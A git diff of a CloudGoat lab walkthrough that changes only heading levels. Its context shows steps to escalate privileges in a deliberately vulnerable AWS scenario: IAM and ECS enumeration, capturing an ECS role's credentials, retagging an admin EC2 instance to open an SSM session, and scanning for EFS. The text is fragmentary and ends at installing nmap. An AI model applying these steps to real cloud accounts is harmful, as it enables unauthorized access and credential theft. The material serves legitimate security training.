@@ -1,11 +1,11 @@
 
-## EFS ECS attack
+# EFS ECS attack
 The goal of this mission is to mount a file system on EFS and retrieve the flag. To build the resources for the scenario:
 ```
 ./cloudgoat.py create ecs_efs_attack
 cd ecs_efs_attack<random generated strings>
 ```
-### Privilege Enumeration
+## Privilege Enumeration
 1. SSH into the instance ```ssh -i cloudgoat ubuntu@<IP address of ruse>```
 2. Create a new profile (inherits the permissions from the EC2) ```aws configure --profile ruse```
 3. Get the instance profile for the EC2 instance ```aws sts get-caller-identity```. The role name is found like so: arn:aws:sts::<account id>:assumed-role/<role name>/<instance id>
@@ -62,13 +62,13 @@ cd ecs_efs_attack<random generated strings>
   ```
   We can see that the actions that are allowed e.g. EC2 (read), ECS (read and write) and iam (read)
 
-### EC2 Enumeration
+## EC2 Enumeration
 1. List all ec2 instances - ```aws ec2 describe-instances```. If you have lots of instances, filter by region and running state: ``` aws ec2 describe-instances --region us-east-1 --filters "Name=instance-state-name, Values=running"```
   Found 2 instances. With StartSession SSM tagged with both:
     * cg-ruse-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion true) 
     * cg-admin-ec2-ecs_efs_attack_cgid6sec93nj4n (StartSesion false) <Note Instance ID>
 
-### ECS Enumeration
+## ECS Enumeration
 1. List clusters - 
   ```
   aws ecs list-clusters
@@ -152,7 +152,7 @@ aws ecs update-service --serivce <service ARN> --cluster <cluster ARN> --task-de
 ```
 {"RoleArn":<ROLEARN>, "AccessKeyId": <AccessKeyId> "SecretAccessKey":"<SecretAccessKey">}
 ```
-### ECS Role Investigation
+## ECS Role Investigation
 1. Investigate the policies associated with the role ARN retrieved from the previous step
 ```
 aws iam list-attached-role-policies --role-name <Role ARN>
@@ -174,7 +174,7 @@ aws iam get-policy-version --policy-arn <Policy ARN> --version-id v1
 ```
 So we need to change the tags on admin ec2 to do that using the instance id role then use SSM to start a session.
 
-### EC2 Admin Privilege Escalation
+## EC2 Admin Privilege Escalation
 1. Use the role credentials from the POST request to assume the ecs role. These will add on to the ruse EC2 credentials.
 ```
 aws configure --profile ecs
@@ -183,7 +183,7 @@ aws configure --profile ecs
 2. Update the tags ``` aws ec2 create-tags --resource <admin instance id> --tags “Key=StartSession,Value=true”```
 3. SSM Start session ```aws ssm start-session --target <admin instance id> --profile ecs```
 
-### Mount EFS
+## Mount EFS
 1. EFS runs on port 2049, so we can scan the network via the following: 
 ```
 sudo snap install nmap -> install nmap
